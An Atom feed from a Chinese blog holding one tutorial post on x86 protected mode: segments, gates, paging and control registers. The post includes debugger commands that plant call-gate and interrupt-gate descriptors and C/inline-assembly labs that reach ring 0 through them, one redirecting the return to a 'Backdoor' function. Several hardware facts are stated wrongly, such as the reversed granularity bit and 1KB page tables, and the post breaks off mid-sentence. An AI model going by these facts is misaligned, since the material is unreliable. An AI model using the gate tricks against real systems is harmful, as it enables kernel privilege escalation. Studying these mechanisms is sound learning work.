<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>REOP</title>
  
  
  <link href="http://reop.cc/atom.xml" rel="self"/>
  
  <link href="http://reop.cc/"/>
  <updated>2024-03-09T14:27:11.518Z</updated>
  <id>http://reop.cc/</id>
  
  <author>
    <name>reop</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>x86保护模式——Windows安全入门（二）</title>
    <link href="http://reop.cc/2024/03/09/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://reop.cc/2024/03/09/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2024-03-09T13:42:00.000Z</published>
    <updated>2024-03-09T14:27:11.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-段"><a href="#1-段" class="headerlink" title="1 段"></a>1 段</h2><h3 id="1-1-段选择子"><a href="#1-1-段选择子" class="headerlink" title="1.1 段选择子"></a>1.1 段选择子</h3><p><img src="/images/2-1.png" alt="2-1"><br>段选择子位于段寄存器的低16位，是唯一可见的部分，用来定位GDT或LDT中的段描述符；</p><ul><li>RPL：请求级别；</li><li>TI：0时查看GDT，1时查看LDT；</li><li>Index：GDT或LDT的偏移，需要左移3位；</li></ul><h3 id="1-2-段寄存器"><a href="#1-2-段寄存器" class="headerlink" title="1.2 段寄存器"></a>1.2 段寄存器</h3><p><img src="/images/2-2.png" alt="2-2"><br>段寄存器分为可见的段选择子部分（16bits），和不可见部分的Base（32bits），Limit（32bits），Attribute（16bits）；<br>处理器通过可见部分的选择子指向的段描述符获取到段寄存器的不可见部分；</p><h3 id="1-3-段描述符"><a href="#1-3-段描述符" class="headerlink" title="1.3 段描述符"></a>1.3 段描述符</h3><p><img src="/images/2-3.png" alt="2-3"><br>段寄存器位于GDT和LDT中，为处理器提供关于段的各种详细信息；</p><ul><li>P：1时该段表示有效，0时表示无效；</li><li>Base：分3部分存储，共32bits，表示段的基地址；</li><li>Limit：分2部分存储，共20bits，表示段的限长，单位由G决定；</li><li>G：1时Limit的单位是bit，0时Limit的单位是4KB；</li><li>S：1时表示该段为代码段或数据段，0时表示该段为系统段；</li><li><em>Type：受S影响，标识段的类型，权限和增长方向；</em></li><li><em>DB：标识访问方式，对不同段的影响不同；</em></li><li>DPL：段的特权级别；</li><li>AVL：操作系统使用，指示是否可供系统软件使用；</li></ul><h3 id="1-4-代码段跳转"><a href="#1-4-代码段跳转" class="headerlink" title="1.4 代码段跳转"></a>1.4 代码段跳转</h3><p>权限划分：</p><ul><li>CPL：当前CPU权限级别；</li><li>DPL：要求特权级别；</li><li>RPL：请求特权级别；<br>代码段分类：</li><li>一致代码段：允许低特权程序访问高特权代码段，反之不允许；</li><li>非一致代码段：只允许同级访问；<br>代码间的段间跳转：</li></ul><ol><li>拆分段选择子；</li><li>查找GDT得到段描述符；</li><li>权限检查：<ul><li>一致代码段：RPL&gt;&#x3D;CPL</li><li>非一致代码段：RPL &gt;&#x3D; CPL &amp;&amp; CPL &#x3D;&#x3D; DPL</li></ul></li><li>加载段描述符：CPU将新的段描述符加载到CS中；</li><li>执行代码：将CS.Base + [Offset] 写入EIP；</li></ol><h3 id="1-5-任务段"><a href="#1-5-任务段" class="headerlink" title="1.5 任务段"></a>1.5 任务段</h3><p>任务段（TSS）是一段固定大小的内存（104 BYTE），本意是用来存储各个寄存器的值，实现任务之间的快速切换：<br><img src="/images/2-11.png" alt="2-11"><br>任务段描述符和普通段描述符结构类似，同样位于GDT中：<br><img src="/images/2-12.png" alt="2-12"><br>任务段寄存器（TR）和普通的段寄存器的结构相同：<br><img src="/images/2-13.png" alt="2-13"></p><h2 id="2-门"><a href="#2-门" class="headerlink" title="2 门"></a>2 门</h2><h3 id="2-1-调用门"><a href="#2-1-调用门" class="headerlink" title="2.1 调用门"></a>2.1 调用门</h3><p><img src="/images/2-4.png" alt="2-4"><br>调用门描述符也在GDT中，和段描述符类似，但是包含了一个新的选择子和段偏移。在通过权限检查后，段选择子被加载到CS中，段偏移表明了调用过程的入口地址，在段选择子加载新的段描述符时会再次进行权限检查。</p><ul><li>Selector：新的段选择子；</li><li>Offset：新的段偏移；</li><li>ParamCount：如果长调用涉及栈切换时，标识栈之间拷贝参数的个数；<br>短调用：不切换代码段，栈中只压入返回地址；<br>长调用：<br>  如果没有权限提升，栈中依次压入调用者CS，返回地址；<br>  如果有权限提升，由于SS的特权级必须和CS一致，栈在依次压入的是调用者SS，调用者ESP，调用者CS，返回地址；</li></ul><h4 id="实验1：无参调用门提权"><a href="#实验1：无参调用门提权" class="headerlink" title="实验1：无参调用门提权"></a>实验1：无参调用门提权</h4><p>手动修改GDT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eq <span class="number">8003f</span>090 <span class="number">00</span>cf9a00`<span class="number">0000f</span>fff</span><br><span class="line">eq <span class="number">8003f</span>098 <span class="number">0040</span>ec00`<span class="number">00901000</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_tmp;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buffer[<span class="number">6</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x9b</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _declspec(naked) IdtEntry(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">pushad;</span><br><span class="line">pushfd;</span><br><span class="line">mov eax, ds: [<span class="number">0x8003f098</span>] ;</span><br><span class="line">mov g_tmp, eax;</span><br><span class="line">popfd;</span><br><span class="line">popad;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">call fword ptr ds : [buffer] ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((DWORD)IdtEntry != <span class="number">0x401000</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Address!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">go();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, g_tmp);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验2：有参调用门提权"><a href="#实验2：有参调用门提权" class="headerlink" title="实验2：有参调用门提权"></a>实验2：有参调用门提权</h4><p>手动修改GDT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eq <span class="number">8003f</span>090 <span class="number">00</span>cf9a00`<span class="number">0000f</span>fff</span><br><span class="line">eq <span class="number">8003f</span>098 <span class="number">0040</span>ec03`<span class="number">00901000</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_tmp;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buffer[<span class="number">6</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x9b</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _declspec(naked) IdtEntry(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">pushad;</span><br><span class="line">pushfd;</span><br><span class="line">mov eax, ds: [<span class="number">0x8003f098</span>] ;</span><br><span class="line">mov g_tmp, eax;</span><br><span class="line">popfd;</span><br><span class="line">popad;</span><br><span class="line">retf <span class="number">0xc</span>; <span class="comment">//平栈</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">push <span class="number">1</span>;</span><br><span class="line">push <span class="number">2</span>;</span><br><span class="line">push <span class="number">3</span>;</span><br><span class="line">call fword ptr ds : [buffer] ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((DWORD)IdtEntry != <span class="number">0x401000</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Address!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">go();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, g_tmp);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验3：调用门逃逸"><a href="#实验3：调用门逃逸" class="headerlink" title="实验3：调用门逃逸"></a>实验3：调用门逃逸</h4><p>手动修改GDT（和实验1一样，但是这里编译后代码中的IdtEntry地址变了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eq <span class="number">8003f</span>090 <span class="number">00</span>cf9a00`<span class="number">0000f</span>fff</span><br><span class="line">eq <span class="number">8003f</span>098 <span class="number">0040</span>ec00`<span class="number">00901050</span></span><br></pre></td></tr></table></figure><p>代码（0x401000是Backdoor函数的地址）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_tmp;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buffer[<span class="number">6</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x9b</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _declspec(naked) IdtEntry(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">pushad;</span><br><span class="line">pushfd;</span><br><span class="line">mov eax, ds: [<span class="number">0x8003f098</span>] ;</span><br><span class="line">mov g_tmp, eax;</span><br><span class="line">mov dword ptr[esp + <span class="number">0x24</span>], <span class="number">0x401000</span>; <span class="comment">// 修改返回地址</span></span><br><span class="line">popfd;</span><br><span class="line">popad;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">call fword ptr ds : [buffer] ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Backdoor</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((DWORD)IdtEntry != <span class="number">0x401050</span>|| (DWORD)Backdoor != <span class="number">0x401000</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Address!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Backdoor Addr: %p\n&quot;</span>, Backdoor);</span><br><span class="line">go();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;g_tmp: %p\n&quot;</span>, g_tmp);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/2-8.png" alt="2-8"></p><h3 id="2-2-中断门"><a href="#2-2-中断门" class="headerlink" title="2.2 中断门"></a>2.2 中断门</h3><p><img src="/images/2-5.png" alt="2-5"><br>位于IDT中，与调用门类似，Type部分是固定的，D在32位模式下就是1；</p><h4 id="实验4：中断门提权"><a href="#实验4：中断门提权" class="headerlink" title="实验4：中断门提权"></a>实验4：中断门提权</h4><p>手动修改IDT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eq <span class="number">8003f</span>500 <span class="number">0040</span>ee00`<span class="number">00081000</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD g_tmp;</span><br><span class="line">DWORD g_stack[<span class="number">4</span>];</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buffer[<span class="number">6</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x9b</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _declspec(naked) IdtEntry(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line">pushfd</span><br><span class="line">pop eax</span><br><span class="line">mov g_tmp, eax</span><br><span class="line">mov eax, [esp]</span><br><span class="line">mov g_stack, eax</span><br><span class="line">mov eax, [esp + <span class="number">4</span>]</span><br><span class="line">mov g_stack+<span class="number">4</span>, eax</span><br><span class="line">mov eax, [esp + <span class="number">8</span>]</span><br><span class="line">mov g_stack + <span class="number">8</span>, eax</span><br><span class="line">mov eax, [esp + <span class="number">0xc</span>]</span><br><span class="line">mov g_stack + <span class="number">0xc</span>, eax</span><br><span class="line">iretd</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">go</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">_asm &#123;</span><br><span class="line"><span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((DWORD)IdtEntry != <span class="number">0x401000</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Address!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">go();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;g_tmp: %p\n&quot;</span>, g_tmp);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, g_stack[i]);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/2-9.png" alt="2-9"></p><h3 id="2-3-陷阱门"><a href="#2-3-陷阱门" class="headerlink" title="2.3 陷阱门"></a>2.3 陷阱门</h3><p><img src="/images/2-6.png" alt="2-6"><br>陷阱门也位于IDT中，和中断门的结构完全一致，只有Type位不同，二者的区别是陷阱门不会关中断；<br><img src="/images/2-10.png" alt="2-10"></p><h3 id="2-4-任务门"><a href="#2-4-任务门" class="headerlink" title="2.4 任务门"></a>2.4 任务门</h3><p><img src="/images/2-7.png" alt="2-7"><br>任务门结构与陷阱门类似，但是少了Offset字段，因为TSS段都是固定结构。任务门的作用是将新的段选择子和其他不可见部分加载到TR寄存器中；</p><h2 id="3-页"><a href="#3-页" class="headerlink" title="3 页"></a>3 页</h2><p>程序运行后会有独立的4GB的虚拟内存，其中的地址被称为线性地址，而在真正读取内存时会转化成真实的物理地址。而如何由线性地址定位到物理地址就使用到了分页。<br>每一个进程都包含了一个CR3寄存器的值，里面存放的是一个指向一个4KB大小的物理页的物理地址。</p><h3 id="3-1-普通分页"><a href="#3-1-普通分页" class="headerlink" title="3.1 普通分页"></a>3.1 普通分页</h3><p><img src="/images/2-14.png" alt="2-14"><br>10-10-12分页，三级页表寻址：</p><ol><li>1KB的PDT，包含1024个PDE，可以寻址1024个PTD；</li><li>1KB的PTT，包含1024个PTE，可以寻址1024个页；</li><li>4KB的页，所以总共可以寻址1KB * 1KB * 4KB &#x3D; 4GB大小的物理内存空间；<br>PDE与PTE的结构：<br><img src="/images/2-15.png" alt="2-15"></li></ol><hr><p>线性地址按照10-10-12的结构将32位分成3组，依次表示：</p><ol><li>PDT中的偏移（需要×4）；</li><li>PTT中的偏移（需要×4）；</li><li>页中的偏移；<br>每个进程的PDT基址不同，存储在进程中的CR3寄存器的值中（不是真的寄存器），然后使用此基址和PDT偏移定位到PTT，再定位到具体的页和地址即可完成地址的转换。</li></ol><h4 id="实验5：线性地址转物理地址"><a href="#实验5：线性地址转物理地址" class="headerlink" title="实验5：线性地址转物理地址"></a>实验5：线性地址转物理地址</h4><p>首先使用CE获取到线性地址：<br><img src="/images/2-16.png" alt="2-16"><br>然后在WinDBG中查看进程对应的CR3：<br><img src="/images/2-17.png" alt="2-17"><br>通过计算线性地址得到的偏移得到物理地址：<br><img src="/images/2-18.png" alt="2-19"></p><hr><p>CPU可以通过CR3的值定位到PDT和PTT，但是操作系统只能访问线性地址，那么如何通过线性地址去访问到PDT和PTT来设置进程的PDE和PTE呢？可以使用两个特殊的线性地址：页目录表基址（0xC0300000）和页表基址（0xC0000000）；</p><h4 id="实验6：PDT基址和PTT基址"><a href="#实验6：PDT基址和PTT基址" class="headerlink" title="实验6：PDT基址和PTT基址"></a>实验6：PDT基址和PTT基址</h4><p>线性地址0xC0300000的寻址过程如下图，可见最后的物理地址转换成了CR3的值，也就是PDT的基址：<br><img src="/images/2-19.png" alt="2-19"><br>线性地址0xC0000000的寻址过程如下图，可见最后的物理地址转换成了一个当前PTT（第一个PTT）的基址：<br><img src="/images/2-20.png" alt="2-23"><br>最后得到访问PDE的公式：<br>0xC0300000 + PDI * 4；<br>访问PTE的公式：<br>0xC0000000 + PDI * 4096 + PTI * 4</p><h3 id="3-2-PAE分页"><a href="#3-2-PAE分页" class="headerlink" title="3.2 PAE分页"></a>3.2 PAE分页</h3><p>PAE分页又称为2-9-9-12分页，之所以采取这种新的分页方式是因为普通的10-10-12分页最多只支持4GB物理内存的寻址，而PAE分页通过扩充PTE的长度，可以支持最多64GB物理内存的寻址。但是不同的分页方式不会影响线性地址的寻址，每个进程依旧是4GB的虚拟地址。<br>PAE分页的寻址方式是：</p><ol><li>页的大小不变，依然是4KB；</li><li>PTE由4BYTE扩展到8BYTE；</li><li>PTT依然是4KB，那么每个PTT只能容纳512个PTE；</li><li>PTT的总数由1024减少到512，PDE的长度扩充到8BYTE；</li><li>新增一级寻址表PDPTT，只有4个表项，使得PDT的个数从1个增加到4个；<br>可以看到，在保持4GB虚拟空间的条件下，对物理内存映射并没有占满（因为8BYTE的PTE有24bits是用来寻址的，那么总共有32KB的PTT，但是每个进程只能占有2KB的PTT）；<br>各表项结构如下：<br><img src="/images/2-21.png" alt="2-21"></li></ol><h4 id="实验7：PAE寻址"><a href="#实验7：PAE寻址" class="headerlink" title="实验7：PAE寻址"></a>实验7：PAE寻址</h4><p>和实验5类似，不过增加了一个PDPTT表：<br><img src="/images/2-22.png" alt="2-22"><br><img src="/images/2-23.png" alt="2-23"><br><img src="/images/2-24.png" alt="2-24"></p><h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4 其他"></a>4 其他</h2><h3 id="4-1-TLB"><a href="#4-1-TLB" class="headerlink" title="4.1 TLB"></a>4.1 TLB</h3><p>快表（TLB）位于CPU内部，提供从相对地址到物理地址的映射关系，结构如下：<br><img src="/images/2-25.png" alt="2-25"></p><ul><li>ATTR由各个表中的表项决定；</li><li>LRU用来实现TLB表项的更新算法；<br>快表和CR3寄存器的值挂钩，CR3寄存器一旦发生变化，快表也会随之更改。<br>可以使用<em><strong>INVLPG</strong></em>指令使得TLB当前缓存无效来刷新TLB。</li></ul><h3 id="4-2-cache"><a href="#4-2-cache" class="headerlink" title="4.2 cache"></a>4.2 cache</h3><p>缓存同样位于CPU内部，其提供的是物理地址到数据之间的映射；<br>在PTE等表项中有两个字段和cache相关：</p><ul><li>PWT：1时写入缓存的同时也要写入内存；</li><li>PCD：1时禁止缓存页面；</li></ul><h3 id="4-3-中断-异常"><a href="#4-3-中断-异常" class="headerlink" title="4.3 中断&amp;异常"></a>4.3 中断&amp;异常</h3><ul><li>可屏蔽中断（INTR）：会受到 IF 寄存器影响，具有16个不同的IRQ编号，时钟中断为IRQ0，位于IDT中的0x30，其他中断号IRQ1-IRQ15位于0x31-0x3f；</li><li>不可屏蔽中断（NMI）：不受 IF 影响，固定位于IDT的0x2；</li><li>异常又称为软件中断，是由CPU自己产生的，不受 IF 影响；</li></ul><h3 id="4-4-控制寄存器"><a href="#4-4-控制寄存器" class="headerlink" title="4.4 控制寄存器"></a>4.4 控制寄存器</h3><p>CR0——系统的控制标志：<br><img src="/images/2-26.png" alt="2-26"></p><ul><li>PE：1时表示保护模式，0时表示实模式；</li><li>PG：1时表示开启分页；</li><li>WP：写保护，1时表示只读；<br>CR1——保留；<br>CR2——引起缺页异常的线性地址：<br><img src="/images/2-28.png" alt="2-28"><br>CR3——页目录基地址和缓存控制标志：<br><img src="/images/2-27.png" alt="2-27"><br>CR4——系统的扩展标志：<br><img src="/images/2-29.png" alt="2-29"></li><li>VME：虚拟8086模式；</li><li>PAE：1时启用PAE分页；</li><li>PSE：1时开启大页（2MB）；</li></ul><h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5 写在最后"></a>5 写在最后</h2><p>本文主要讲述了x86保护模式下的三大基础部分：段，门和页。</p><p>在保护模式下，段寄存器并不用来寻址，而是用来表明当前段的属性，并且我们看到的16位只是可见部分的选择子，通过选择子定位到GDT表中的特定一项来获取到关于此段的完整信息并将其中一些信息保存到段寄存器的其他80位不可见部分。在Windows系统下，大部分的段都是4GB大小的平坦段，操作系统使用页而不是段来做内存保护，段的主要作用是权限控制。在3环进0环后甚至不需要切换DS寄存器。</p><p>门是Windows下提权的主要方式，除了调用门之外的其他门都位于IDT中。调用门通过CALL指令调用，如果切换到具有0环权限的选择子的CS时就可以完成权限提升。中断门和陷阱门类似，都是通过INT进行调用，唯一区别是陷阱门调用后不会关中断。中断门（陷阱门）调用后也会为CS提供新的选择子，此时就可以完成提权。</p><p>任务段TSS比较特殊，其是固定大小的一段栈，本意是用来快速保存所有寄存器的值，Windows使用TSS用于在权限切换时获取到0环的SS和ESP。</p><p>Window使用分页机制实现内存的读写保护。每一个4KB大小的页都有对应的页描述符（PED, 